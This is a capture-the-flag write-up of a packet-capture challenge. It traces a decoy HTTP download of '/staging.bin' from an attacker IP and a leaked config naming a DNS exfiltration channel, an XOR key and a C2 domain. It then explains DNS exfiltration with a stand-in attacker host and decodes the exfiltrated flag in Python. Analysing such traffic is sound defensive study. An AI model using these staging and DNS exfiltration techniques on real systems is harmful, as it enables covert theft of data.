# Bad Guys Be Bad

> **Category:** Traffic Analysis / PCAP · **Points:** 350 · **Track:** [Traffic Analysis](README.md)

## Scenario

The task is to find DEADFACE's "deepest darkest secret", hidden somewhere on an external file location, given a packet capture of the relevant traffic.

## Step 1: Find the suspicious conversation

Instead of reading every single packet, the capture was first summarised by counting how many packets were exchanged between each pair of IP addresses. Most of the traffic was noise going to `93.184.x.x` (the IP range officially reserved for `example.com`, a classic decoy used in security training material). One IP stood out: `45.13.37.7`, which had a real back-and-forth conversation.

> **Beginner tip:** when a pcap contains lots of IPs, start by building a simple "who talked to who, how many packets" summary. Real attacker infrastructure usually stands out from documentation/test IP ranges once traffic is grouped this way; there is no need to read every packet by hand.

## Step 2: Read that conversation's content

Reconstructing the full TCP stream with `45.13.37.7` turned out to be a plain HTTP request:

```
GET /staging.bin HTTP/1.1
Host: 45.13.37.7:8080
User-Agent: X-Loader/1.0 (bmljZSB0cnkgLSB3cm9uZyB0aHJlYWQsIGtlZXAgZGlnZ2luZw==)
```

The `User-Agent` header contains a Base64 string:

```python
import base64
print(base64.b64decode('bmljZSB0cnkgLSB3cm9uZyB0aHJlYWQsIGtlZXAgZGlnZ2luZw=='))
# -> b'nice try - wrong thread, keep digging'
```

This confirmed the connection was a decoy deliberately planted by the challenge author. Interestingly, the server's HTTP response body still leaked something useful even though the connection itself was a dead end: it contained a staged config file:

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream

# staging config -- do not commit
mode=exfil
channel=dns
xor_key=Sp00ky
target=exfil.deadface-c2.net
```

This points at exactly where to look next: the real exfiltration channel is DNS, using an XOR key of `Sp00ky`, sending to the domain `exfil.deadface-c2.net`.

## Step 3: Find and reassemble the DNS exfiltration

DNS exfiltration works by encoding stolen data into the sub-domain part of DNS lookup requests (e.g. `s00-xxxxxxx.exfil.attacker.com`), these requests look like normal DNS traffic to a casual glance, but the attacker's own DNS server logs every query and reconstructs the data from the sub-domain labels. Filtering the capture for any DNS query containing `deadface-c2` surfaced five sequential chunks named `s00-...` through `s04-...`, each carrying a Base32-encoded fragment.

## Step 4: Decode, Base32 first, then XOR

The five chunks were concatenated in numeric order, Base32-decoded (Base32 is similar to Base64 but uses only uppercase letters and digits 2–7, common in DNS exfiltration because DNS labels are case-insensitive), and then XOR-decrypted using the key `Sp00ky` found earlier:

```python
import base64

chunks = ['G4KVCVANDAYB', 'KS2TLETCOASR',
          'KYGRAMBPKJKT', 'IGZGANBVSBI6', 'FY']
b32 = ''.join(chunks).upper()
b32 += '=' * ((-len(b32)) % 8)
raw = base64.b32decode(b32)
key = b'Sp00ky'
out = bytes(b ^ key[i % len(key)] for i, b in enumerate(raw))
print(out)
```

```
b'deadface{c2_traffic_be_bussing}'
```

## Flag

```
deadface{c2_traffic_be_bussing}
```

---
[← Back to index](../../README.md)
